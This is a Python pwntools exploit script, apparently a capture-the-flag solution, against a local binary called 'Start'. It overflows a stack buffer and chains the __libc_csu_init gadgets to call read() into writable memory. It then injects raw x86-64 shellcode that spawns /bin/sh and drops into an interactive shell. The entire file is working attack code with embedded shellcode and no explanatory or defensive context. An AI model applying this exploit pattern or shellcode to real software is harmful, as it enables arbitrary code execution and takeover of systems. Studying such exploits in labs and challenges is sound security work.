#!/usr/bin/env python

from pwn import *

context(os="linux",arch="amd64")
BINARY = "./Start"
elf=ELF(BINARY)
static=0x601000
libc='/lib/x86_64-linux-gnu/libc.so.6'
r=process(BINARY)
libc_csu_init_a=0x4005ba
libc_csu_init_b=0x4005a0
payload=''
payload+='A'*16
payload+='A'*8
payload+=p64(libc_csu_init_b)
payload += p64(0) # rbx
payload += p64(1) # rbp
payload += p64(elf.got['read']) # r12 -> rip
payload += p64(1024) # r13 -> rdx
payload += p64(static + 0x900) # r14 -> rsi
payload += p64(0) # r15 -> edi
payload += p64(libc_csu_init_a)
payload += 'A' * 8 # add 8
payload += 'A' * 8 # rbx
payload += 'A' * 8 # rbp
payload += 'A' * 8 # r12
payload += 'A' * 8 # r13
payload += 'A' * 8 # r14
payload += 'A' * 8 # r15
payload += p64(static + 0x900)
r.send(payload)
time.sleep(1)
shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
r.send(shellcode)
time.sleep(1)

r.sendline('id')
r.interactive()
